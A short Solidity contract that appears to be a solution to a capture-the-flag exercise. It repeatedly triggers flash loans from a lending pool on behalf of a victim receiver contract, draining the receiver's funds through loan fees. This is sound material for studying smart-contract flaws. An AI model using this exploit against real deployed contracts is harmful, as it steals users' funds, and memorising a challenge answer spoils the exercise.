// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool public pool;
    address public receiver;
    
    constructor(address _pool, address _receiver) {
        pool = NaiveReceiverLenderPool(payable(_pool));
        receiver = _receiver;
    }

    function attack() external {
        // do it 10 times
        for (uint i=0; i<=9; i++) {
            pool.flashLoan(IERC3156FlashBorrower(receiver), pool.ETH(), 1 ether, "");
        }
    }
}